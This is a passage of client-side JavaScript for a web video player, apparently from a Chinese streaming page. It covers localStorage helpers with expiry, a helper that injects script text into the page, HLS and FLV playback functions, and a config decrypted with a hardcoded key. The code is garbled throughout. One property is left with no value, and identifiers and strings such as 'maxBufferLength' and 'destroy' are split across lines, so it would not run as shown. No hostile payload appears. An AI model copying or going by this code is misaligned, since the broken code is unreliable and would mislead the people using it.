                            }
                        ,
                            'setItem'
                        :

                            function (key, value, expire) {
                                var data = {value: value, expirse: expire * 1000 + new Date().getTime()};
                                localStorage.setItem(key, JSON.stringify(data))
                            }

                        ,
                            'getItem'
                        :

                            function (key) {
                                var data = JSON.parse(localStorage.getItem(key));
                                if (data !== null) {
                                    if (data.expirse != null && new Date().getTime() > data.expirse) {
                                        localStorage.removeItem(key)
                                    } else {
                                        return data.value
                                    }
                                }
                                return null
                            }

                        ,
                            'cryptJs'
                        :



                        ,
                            'script'
                        :

                            function (content) {
                                let script = document.createElement('script'),
                                    head = document.getElementsByTagName('head')[0];
                                script.text = content;
                                head.appendChild(script)
                            }
                        }
                        ;

                        function getrgb(str) {
                            var pattern = new RegExp(/^#[0-9a-fA-F]{6}$/);
                            if (!pattern.test(str)) {
                                return
                            }
                            var num = parseInt(str.slice(1), 16);
                            var b = num % 256;
                            num = parseInt(num / 256);
                            var g = num % 256;num = parseInt(num / 256);
                            var r = num % 256;
                            return 'rgb(' + r + "," + g + "," + b + ")"
                        }

                        function playM3u8(video, url, art) {
                            if (Hls.isSupported()) {
                                var config = {
                                    maxBuf
                                    ferLength: 120
                                };
                                const hls = new Hls(config);
                                hls.loadSource(url);
                                hls.attachMedia(video);
                                art.hls = hls;
                                art.once('url', () => hls.destroy());
                                art.once('d
                                estroy
                                ',()=>hls.destroy())}else if(video.canPlayType('
                                application / vnd.apple.mpegurl
                                ')){video.src=url}else{art.notice.show='
                                错误的m3u8视频, 无
                                法解析播放
                                '}}function playFlv(video,url,art){if(flvjs.isSupported()){const flv=flvjs.createPlayer({type:'
                                flv
                                ',url});flv.attachMediaElement(vi
                                deo
                            )
                                ;flv.load();
                                art.flv = flv;
                                art.once('url', () => flv.destroy());
                                art.once('destroy', () => flv.destroy())
                            } else {
                                art.notice.show = '错误的flv视频,无法 解析播放'
                            }
                        };config = JSON.parse(stray.cryptJs(player, 'VFBTzdujpR9FWBhe', rand));
                        stray.start();
